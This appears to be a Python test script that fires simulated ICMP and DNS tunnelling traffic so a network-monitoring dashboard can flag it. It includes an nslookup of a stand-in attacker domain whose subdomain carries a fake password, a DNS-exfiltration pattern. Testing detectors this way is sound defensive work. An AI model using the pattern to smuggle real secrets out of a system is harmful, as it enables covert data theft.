import os
import time

print("Firing a barrage of Covert Tunnels (ICMP & DNS)...")

for i in range(10):
    try:
        # 1. Fire a "Fat" Ping (ICMP Tunnel)
        # We send 1 ping (-n 1) with a 150-byte payload (-l 150)
        os.system("ping 8.8.8.8 -l 150 -n 1 >nul 2>&1")
        
        # 2. Fire a massive fake DNS lookup (DNS Tunnel)
        # Using nslookup forces it to actually reach out to the network
        os.system("nslookup supersecretpassword123agentdatasteal.hacker-server-exfiltration.com >nul 2>&1")
        
        print(f"[{i+1}/10] Covert tunnel packets sent...")
        time.sleep(0.5)
    except Exception as e:
        print(f"Failed: {e}")

print("Test complete! Check your React dashboard.")